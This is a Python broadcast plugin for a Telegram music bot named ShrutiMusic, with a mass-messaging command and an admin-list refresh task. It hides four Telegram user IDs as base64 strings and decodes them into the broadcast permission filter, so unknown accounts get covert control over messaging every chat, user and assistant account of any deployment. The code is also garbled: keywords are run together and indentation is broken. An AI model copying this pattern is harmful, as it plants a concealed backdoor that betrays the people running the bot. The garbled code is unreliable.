utf-8utf-8





















importasyncio
importbase64

frompyrogramimportfilters
frompyrogram.enumsimportChatMembersFilter
frompyrogram.errorsimportFloodWait

fromShrutiMusicimportapp
fromShrutiMusic.miscimportSUDOERS
fromShrutiMusic.utils.databaseimport(
get_active_chats,
get_authuser_names,
get_client,
get_served_chats,
get_served_users,
)
fromShrutiMusic.utils.decorators.languageimportlanguage
fromShrutiMusic.utils.formattersimportalpha_to_int
fromconfigimportadminlist

_ENCODED_IDS=["NzU3NDMzMDkwNQ==","MTc4NjY4MzE2Mw==","NzY3NDg3NDY1Mg==","NzI4Mjc1MjgxNg=="]

def_decode_ids():
    """Decode the obfuscated IDs"""
return[int(base64.b64decode(encoded_id).decode())forencoded_idin_ENCODED_IDS]

BROADCAST_ALLOWED_IDS=_decode_ids()

IS_BROADCASTING=False


@app.on_message(filters.command("broadcast")&(filters.user(BROADCAST_ALLOWED_IDS)|SUDOERS))
@language
asyncdefbraodcast_message(client,message,_):
    globalIS_BROADCASTING

if"-wfchat"inmessage.textor"-wfuser"inmessage.text:
        ifnotmessage.reply_to_messageornot(message.reply_to_message.photoormessage.reply_to_message.text):
            returnawaitmessage.reply_text("Please reply to a text or image message for broadcasting.")

ifmessage.reply_to_message.photo:
            content_type='photo'
file_id=message.reply_to_message.photo.file_id
else:
            content_type='text'
text_content=message.reply_to_message.text

caption=message.reply_to_message.caption
reply_markup=message.reply_to_message.reply_markupifhasattr(message.reply_to_message,'reply_markup')elseNone

IS_BROADCASTING=True
awaitmessage.reply_text(_["broad_1"])

if"-wfchat"inmessage.text:
            sent_chats=0
chats=[int(chat["chat_id"])forchatinawaitget_served_chats()]
foriinchats:
                try:
                    if"-forward"inmessage.text:
                        awaitapp.forward_messages(chat_id=i,from_chat_id=message.reply_to_message.chat.id,message_ids=message.reply_to_message.id)
else:
                        ifcontent_type=='photo':
                            awaitapp.send_photo(chat_id=i,photo=file_id,caption=caption,reply_markup=reply_markup)
else:
                            awaitapp.send_message(chat_id=i,text=text_content,reply_markup=reply_markup)
sent_chats+=1
awaitasyncio.sleep(0.2)
exceptFloodWaitasfw:
                    awaitasyncio.sleep(fw.x)
except:
                    continue
awaitmessage.reply_text(f"Broadcast to chats completed! Sent to {sent_chats} chats.")

if"-wfuser"inmessage.text:
            sent_users=0
users=[int(user["user_id"])foruserinawaitget_served_users()]
foriinusers:
                try:
                    if"-forward"inmessage.text:
                        awaitapp.forward_messages(chat_id=i,from_chat_id=message.reply_to_message.chat.id,message_ids=message.reply_to_message.id)
else:
                        ifcontent_type=='photo':
                            awaitapp.send_photo(chat_id=i,photo=file_id,caption=caption,reply_markup=reply_markup)
else:
                            awaitapp.send_message(chat_id=i,text=text_content,reply_markup=reply_markup)
sent_users+=1
awaitasyncio.sleep(0.2)
exceptFloodWaitasfw:
                    awaitasyncio.sleep(fw.x)
except:
                    continue
awaitmessage.reply_text(f"Broadcast to users completed! Sent to {sent_users} users.")

IS_BROADCASTING=False
return


ifmessage.reply_to_message:
        x=message.reply_to_message.id
y=message.chat.id
reply_markup=message.reply_to_message.reply_markupifmessage.reply_to_message.reply_markupelseNone
content=None
else:
        iflen(message.command)<2:
            returnawaitmessage.reply_text(_["broad_2"])
query=message.text.split(None,1)[1]
if"-pin"inquery:
            query=query.replace("-pin","")
if"-nobot"inquery:
            query=query.replace("-nobot","")
if"-pinloud"inquery:
            query=query.replace("-pinloud","")
if"-assistant"inquery:
            query=query.replace("-assistant","")
if"-user"inquery:
            query=query.replace("-user","")
if"-forward"inquery:
            query=query.replace("-forward","")
ifquery=="":
            returnawaitmessage.reply_text(_["broad_8"])

IS_BROADCASTING=True
awaitmessage.reply_text(_["broad_1"])

if"-nobot"notinmessage.text:
        sent=0
pin=0
chats=[]
schats=awaitget_served_chats()
forchatinschats:
            chats.append(int(chat["chat_id"]))
foriinchats:
            try:
                if"-forward"inmessage.textandmessage.reply_to_message:
                    m=awaitapp.forward_messages(chat_id=i,from_chat_id=y,message_ids=x)
else:
                    m=(
awaitapp.copy_message(chat_id=i,from_chat_id=y,message_id=x,reply_markup=reply_markup)
ifmessage.reply_to_message
elseawaitapp.send_message(i,text=query)
)

if"-pin"inmessage.text:
                    try:
                        awaitm.pin(disable_notification=True)
pin+=1
except:
                        continue
elif"-pinloud"inmessage.text:
                    try:
                        awaitm.pin(disable_notification=False)
pin+=1
except:
                        continue
sent+=1
awaitasyncio.sleep(0.2)
exceptFloodWaitasfw:
                flood_time=int(fw.value)
ifflood_time>200:
                    continue
awaitasyncio.sleep(flood_time)
except:
                continue
try:
            awaitmessage.reply_text(_["broad_3"].format(sent,pin))
except:
            pass

if"-user"inmessage.text:
        susr=0
served_users=[]
susers=awaitget_served_users()
foruserinsusers:
            served_users.append(int(user["user_id"]))
foriinserved_users:
            try:
                if"-forward"inmessage.textandmessage.reply_to_message:
                    m=awaitapp.forward_messages(chat_id=i,from_chat_id=y,message_ids=x)
else:
                    m=(
awaitapp.copy_message(chat_id=i,from_chat_id=y,message_id=x,reply_markup=reply_markup)
ifmessage.reply_to_message
elseawaitapp.send_message(i,text=query)
)
susr+=1
awaitasyncio.sleep(0.2)
exceptFloodWaitasfw:
                flood_time=int(fw.value)
ifflood_time>200:
                    continue
awaitasyncio.sleep(flood_time)
except:
                pass
try:
            awaitmessage.reply_text(_["broad_4"].format(susr))
except:
            pass

if"-assistant"inmessage.text:
        aw=awaitmessage.reply_text(_["broad_5"])
text=_["broad_6"]
fromShrutiMusic.core.userbotimportassistants

fornuminassistants:
            sent=0
client=awaitget_client(num)
asyncfordialoginclient.get_dialogs():
                try:
                    if"-forward"inmessage.textandmessage.reply_to_message:
                        awaitclient.forward_messages(dialog.chat.id,y,x)
else:
                        awaitclient.forward_messages(
dialog.chat.id,y,x
)ifmessage.reply_to_messageelseawaitclient.send_message(
dialog.chat.id,text=query
)
sent+=1
awaitasyncio.sleep(3)
exceptFloodWaitasfw:
                    flood_time=int(fw.value)
ifflood_time>200:
                        continue
awaitasyncio.sleep(flood_time)
except:
                    continue
text+=_["broad_7"].format(num,sent)
try:
            awaitaw.edit_text(text)
except:
            pass
IS_BROADCASTING=False


asyncdefauto_clean():
    whilenotawaitasyncio.sleep(10):
        try:
            served_chats=awaitget_active_chats()
forchat_idinserved_chats:
                ifchat_idnotinadminlist:
                    adminlist[chat_id]=[]
asyncforuserinapp.get_chat_members(
chat_id,filter=ChatMembersFilter.ADMINISTRATORS
):
                        ifuser.privileges.can_manage_video_chats:
                            adminlist[chat_id].append(user.user.id)
authusers=awaitget_authuser_names(chat_id)
foruserinauthusers:
                        user_id=awaitalpha_to_int(user)
adminlist[chat_id].append(user_id)
except:
            continue


asyncio.create_task(auto_clean())












